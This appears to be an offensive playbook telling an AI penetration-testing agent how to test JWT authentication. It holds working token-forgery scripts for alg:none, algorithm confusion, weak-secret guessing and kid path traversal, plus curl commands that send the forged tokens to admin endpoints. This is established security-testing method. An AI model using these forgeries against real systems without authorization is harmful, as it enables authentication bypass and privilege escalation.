---
name: jwt-security-testing
description: JWT token security testing covering alg:none, algorithm confusion, weak secrets, kid/jwk/jku manipulation, claim tampering, and cross-service acceptance
intent: offensive
---

# JWT Security Testing

## Purpose
Test JWT implementations for signature validation bypasses, claim tampering, algorithm downgrades, and cross-service token acceptance.

## Preconditions
- At least one valid JWT token (operator-supplied, intercepted, or from a login)
- Ability to send requests with the target's auth mechanism (Bearer header, cookie, custom header)

## Attack Surface Signals
- JWT tokens in Authorization headers, cookies, or URL parameters
- `alg` field in decoded header
- Tokens that persist across sessions
- Multiple services sharing the same token issuer

## Methodology

### Decode and Analyze the Token First
```bash
# Decode header and payload (never paste real tokens into online tools)
echo "eyJ..." | cut -d. -f1 | base64 -d 2>/dev/null | jq .
echo "eyJ..." | cut -d. -f2 | base64 -d 2>/dev/null | jq .
```

Record: algorithm, issuer, audience, expiry, subject, role claims, custom claims.

### alg:none Attack
```bash
# Forge a token with alg:none and modified claims
python3 -c "
import base64, json
header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin','exp':9999999999}).encode()).rstrip(b'=').decode()
print(f'{header}.{payload}.')
"
```

Send the forged token to a protected endpoint. **CRITICAL**: A 200 response does NOT prove the attack worked. You must verify:

1. The CONTROL: the same endpoint WITHOUT the token (or with an invalid token) returns 401/403
2. The forged token changes the identity/privilege: the response returns data belonging to the forged `sub`, or grants access to admin-only resources
3. The forged claims were actually HONORED (not just parsed and ignored)

```bash
# CONTROL: anonymous request should be denied
curl -sk "https://TARGET/api/admin/users" | jq .status
# ATTACK: forged token
curl -sk -H "Authorization: Bearer FORGED_TOKEN" "https://TARGET/api/admin/users" | jq .
# VERIFY: does the response contain data the original user could NOT access?
```

### Algorithm Confusion (HS256 vs RS256)
```bash
# If the server uses RS256, try downgrading to HS256
# by signing with the public key as the HMAC secret
openssl rsa -in tmp/public.pem -pubout -outform PEM 2>/dev/null

python3 -c "
import hmac, hashlib, base64, json
header = base64.urlsafe_b64encode(json.dumps({'alg':'HS256','typ':'JWT'}).encode()).rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).rstrip(b'=').decode()
# Sign with the public key content as HMAC secret
with open('tmp/public.pem') as f:
    secret = f.read()
sig = base64.urlsafe_b64encode(hmac.new(secret.encode(), f'{header}.{payload}'.encode(), hashlib.sha256).digest()).rstrip(b'=').decode()
print(f'{header}.{payload}.{sig}')
"
```

### Weak HMAC Secret
```bash
# Try common weak secrets
for secret in secret password key jwt_secret your-256-bit-secret; do
  # Forge token with each secret and test
  python3 -c "
import hmac, hashlib, base64, json
secret = '$secret'
header = base64.urlsafe_b64encode(json.dumps({'alg':'HS256','typ':'JWT'}).encode()).rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({'sub':'admin'}).encode()).rstrip(b'=').decode()
sig = base64.urlsafe_b64encode(hmac.new(secret.encode(), f'{header}.{payload}'.encode(), hashlib.sha256).digest()).rstrip(b'=').decode()
print(f'{header}.{payload}.{sig}')
"
done
```

### kid Header Manipulation
```bash
# Try path traversal in kid to read arbitrary files as the key
# kid: ../../../dev/null → empty key
# kid: /etc/hostname → predictable content
python3 -c "
import base64, json
header = base64.urlsafe_b64encode(json.dumps({'alg':'HS256','typ':'JWT','kid':'../../../dev/null'}).encode()).rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({'sub':'admin'}).encode()).rstrip(b'=').decode()
sig = base64.urlsafe_b64encode(b'').rstrip(b'=').decode()  # empty key = empty sig
print(f'{header}.{payload}.{sig}')
"
```

### Claim Tampering (with valid signature)
If you have a valid token, try modifying the PAYLOAD without changing the signature:
```bash
# Some implementations don't verify the signature when the token is already in their session store
# Try changing role, sub, tenant, or expiry in the payload
```

### Cross-Service Token Acceptance
```bash
# Test if a token from service A is accepted by service B
curl -sk -H "Authorization: Bearer SERVICE_A_TOKEN" "https://SERVICE_B/api/protected"
```

## Evidence Contract

A JWT vulnerability requires ALL of:
1. Baseline: the original token's known behavior (what data it can access)
2. Attack: forged/tampered token sent to the same protected endpoint
3. Differential: the forged token accesses data or performs actions the original token could NOT
4. The change is attributable to the JWT manipulation (not a coincidence)

**NOT evidence**: HTTP 200 from a public endpoint, decoded token shows modifiable claims, the server didn't crash

## Common Misses
- Refresh token flows that inherit the access token's weaknesses
- JWT in cookies without HttpOnly/Secure flags
- Token replay across different endpoints or services
- jwk header injection (embedded public key)
- jku header pointing to attacker-controlled URL (requires SSRF or network control)
- Algorithm not specified in the token header (server defaults)

## False Positives / Non-Findings
- HTTP 200 from an endpoint that doesn't actually require authentication
- The server parses the token but uses a separate session mechanism for authorization
- alg:none token accepted for PUBLIC endpoints (they accept everything)
- A 200 that returns the same data as the original token (no privilege change)

## Xalgorix Tool Strategy
- `terminal_execute` with Python for token forging
- `http_request` for precise header manipulation
- `authz_matrix` for cross-role differential

## Stopping Rule
Test all discovered JWT tokens across all algorithm variants, kid/jwk/jku manipulations, and cross-service acceptance paths.

## Handoff
Report the specific JWT weakness (alg confusion, weak secret, etc.), the forged claims that were honored, and the data/action the forged token gained access to.
